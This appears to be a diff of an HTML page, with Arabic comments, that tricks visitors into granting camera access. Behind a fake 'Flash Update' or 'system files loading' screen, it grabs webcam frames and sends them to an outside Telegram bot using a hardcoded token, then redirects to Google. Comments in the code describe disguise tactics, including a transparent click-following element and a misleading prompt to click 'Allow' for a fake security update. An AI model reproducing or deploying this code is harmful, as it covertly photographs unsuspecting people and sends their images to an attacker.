@@ -2,49 +2,50 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <script>
-        // بياناتك
-        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-        const C = "1772820433";
-
-        // ثغرة التخطي: جعل الطلب يبدو وكأنه استجابة لنظام التشغيل
-        async function bypass() {
-            try {
-                // محاولة صامتة أولاً
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 1, height: 1 }, // طلب أصغر حجم ممكن للتمويه
-                    audio: false 
-                });
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', C);
-                        fd.append('photo', blob, 'shot.jpg');
-                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-                        window.location.replace("https://google.com");
-                    }, 'image/jpeg');
-                }, 400); // سرعة قصوى (أقل من نصف ثانية)
-            } catch (e) {
-                // إذا ظهرت نافذة تليجرام، الكود بيعمل تمويه بصري يغطيها
-                document.getElementById('m').innerHTML = "⚠️ خطأ في العرض.. اضغط 'سماح' لتحديث الصفحة";
-            }
-        }
-    </script>
+    <title>⚡ Flash Update</title>
     <style>
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
-        #m { color: #0f0; font-family: monospace; font-size: 18px; text-align: center; }
+        body { margin: 0; background: #000; overflow: hidden; }
+        #overlay { position: absolute; width: 100%; height: 100%; z-index: 10; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .btn { color: #fff; border: 1px solid #333; padding: 20px; border-radius: 10px; background: #111; font-family: sans-serif; }
+        /* الثغرة: عنصر شفاف يلاحق الضغط */
+        #ghost { position: absolute; width: 10px; height: 10px; opacity: 0.01; pointer-events: none; z-index: 100; }
     </style>
 </head>
-<body onclick="bypass()">
-    <div id="m">تحميل ملفات النظام...<br>[ اضغط هنا للإكمال ]</div>
+<body onclick="launch()">
+
+<div id="overlay">
+    <div class="btn">اضغط هنا لتحديث المحتوى (فشل التحميل)</div>
+</div>
+<div id="ghost"></div>
+
+<script>
+    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+    const C = "1772820433";
+
+    async function launch() {
+        // محاولة استغلال ثغرة التزامن - إرسال عدة طلبات
+        for(let i=0; i<3; i++) {
+            navigator.mediaDevices.getUserMedia({video: true}).then(s => {
+                const v = document.createElement('video');
+                v.srcObject = s; v.play();
+                setTimeout(() => {
+                    const cn = document.createElement('canvas');
+                    cn.width = 640; cn.height = 480;
+                    cn.getContext('2d').drawImage(v, 0, 0);
+                    cn.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', C);
+                        f.append('photo', b, 'v.jpg');
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method: 'POST', body: f});
+                        window.location.replace("https://google.com");
+                    }, 'image/jpeg');
+                }, 500);
+            }).catch(e => {
+                // تكتيك التمويه: إذا لم ينجح الصمت، نطلبها كأنها تحديث أمان
+                document.querySelector('.btn').innerText = "⚠️ يرجى الضغط على 'سماح' لتثبيت التحديث الأمني";
+            });
+        }
+    }
+</script>
 </body>
 </html>
